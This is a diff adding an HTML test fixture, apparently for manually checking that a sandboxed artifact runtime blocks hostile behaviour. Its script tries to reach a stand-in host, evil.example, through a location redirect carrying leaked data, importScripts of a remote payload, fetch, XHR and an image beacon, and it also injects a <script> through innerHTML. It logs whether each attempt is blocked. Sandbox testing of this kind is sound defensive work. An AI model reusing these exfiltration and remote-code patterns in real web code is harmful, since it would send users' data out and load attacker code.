@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hostile artifact (manual verification fixture)</title>
+</head>
+<body>
+  <div id="app">running…</div>
+  <script>
+    // Manual verification fixture — NOT run by any automated test (Node cannot reproduce a Worker's
+    // location, or CSP-blocked importScripts/fetch/XHR — see docs/design.md §8's "Manual verification
+    // checklist" and the "Node で再現不能な事項" note in the WP plan this fixture came from).
+    //
+    // How to use: mount this HTML as an L2 SandboxArtifact (sha256 it and pass {inline, sha256} through
+    // mountSandbox — sample-web's L2 demo path is the easiest way to get it in front of a real iframe),
+    // open chrome-devtools' Console and Network panels, and confirm:
+    //   1. zero Content-Security-Policy violation entries in the console
+    //   2. zero outbound network requests (Network panel stays empty for anything this script attempts)
+    // Every attempt below is expected to be blocked or neutralized before it can produce either — most
+    // never even reach a point where CSP itself has to intervene, because the Worker DOM shim / applier
+    // allowlist already stops them earlier (see guest/worker-shim.ts and guest/dom-applier.ts).
+    async function main() {
+      const log = [];
+      const record = (label, outcome) => log.push(`${label}: ${outcome}`);
+
+      // 1. Assigning self.location.href — a real WorkerLocation has no setter; expect a TypeError (strict
+      // mode) rather than an actual navigation. (document.location is separately a getter-only no-op — see
+      // worker-shim.ts's SBX-EXEC-001 note — this attempt targets the real Worker global instead.)
+      try {
+        self.location.href = "https://evil.example/exfiltrate?data=leaked";
+        record("self.location.href assignment", "did NOT throw (investigate)");
+      } catch (e) {
+        record("self.location.href assignment", `blocked (${e.message})`);
+      }
+
+      // 2. importScripts — worker-shim.ts overwrites it to undefined at bootstrap, before this script runs.
+      try {
+        importScripts("https://evil.example/payload.js");
+        record("importScripts", "did NOT throw (investigate)");
+      } catch (e) {
+        record("importScripts", `blocked (${e.message})`);
+      }
+
+      // 3. fetch — overwritten to undefined; the CSP's connect-src 'none' is the backstop if it were not.
+      try {
+        await fetch("https://evil.example/exfiltrate");
+        record("fetch", "did NOT throw (investigate)");
+      } catch (e) {
+        record("fetch", `blocked (${e.message})`);
+      }
+
+      // 4. XMLHttpRequest — overwritten to undefined.
+      try {
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://evil.example/exfiltrate");
+        xhr.send();
+        record("new XMLHttpRequest()", "did NOT throw (investigate)");
+      } catch (e) {
+        record("new XMLHttpRequest()", `blocked (${e.message})`);
+      }
+
+      // 5. innerHTML="<script>...</script>" — the shim's HTML parser accepts the markup (parsing is not
+      // sanitization), but the applier's allowlist rejects the <script> element outright: it never becomes
+      // a real DOM node, so it never executes.
+      try {
+        const host = document.getElementById("app");
+        host.innerHTML = '<div>before</div><script>window.__hostileScriptRan = true;<\/script><div>after</div>';
+        record("innerHTML with an embedded <script>", "parsed (check the real DOM for an actual <script> element — there should be none)");
+      } catch (e) {
+        record("innerHTML with an embedded <script>", `threw (${e.message})`);
+      }
+
+      // 6. An <img src=https://...> — also denied by the applier's tag allowlist (img is not in
+      // ALLOWED_TAGS), so it never becomes a real <img> and never issues a network request.
+      try {
+        const img = document.createElement("img");
+        img.src = "https://evil.example/beacon.png";
+        document.getElementById("app").appendChild(img);
+        record("<img src=https://...>", "created in the shim (check the real DOM / Network panel for an actual request — there should be none)");
+      } catch (e) {
+        record("<img src=https://...>", `threw (${e.message})`);
+      }
+
+      document.getElementById("app").textContent = log.join(" | ");
+      window.kohaku.ready();
+    }
+    main();
+  </script>
+</body>
+</html>
